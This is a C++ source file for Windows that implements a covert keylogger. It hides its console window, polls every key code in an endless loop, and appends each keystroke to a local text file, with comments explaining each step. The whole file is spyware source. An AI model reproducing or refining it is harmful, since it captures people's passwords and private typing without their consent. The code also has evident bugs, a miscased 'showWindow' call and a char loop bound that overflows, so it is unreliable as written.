#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

void logKeys_appendFile();

int main(){
    //hides console window
    showWindow(GetConsoleWindow(), SW_HIDE);
    logKeys_appendFile();
}

void logKeys_appendFile(){
    while(true) {
        for(char key = 0; key <= 254; key++){
            //determines if key is pressed
            if(GetAsyncKeyState(key) & 0x1){
                ofstream file;
                //will create file if it doesnt exists
                //keys will append to file
                file.open("file.txt", ios::app);
                //detects if i is equal to any of the following virtual key codes (Winuser.h). If yes appends char to file 
                switch (key) {
                    case VK_BACK: 
                        file << "[backspace]"; 
                        break;
                    case VK_TAB:
                        file << "[tab]";
                        break;
                    case VK_RETURN:
                        file << "[enter]";
                        break;
                    case VK_SHIFT:
                        file << "[shift]";
                        break;
                    case VK_CONTROL:
                        file << "[ctrl]";
                        break;
                    case VK_MENU:
                        file << "[alt]";
                        break;
                    case VK_ESCAPE:
                        file << "[esc]";
                        break;
                    case VK_SPACE:
                        file << "[space]";
                        break;
                    //if no cases are valid key will be appended 
                    default:
                        file << key;
                }
                file.close();

            }

        }
    }
}
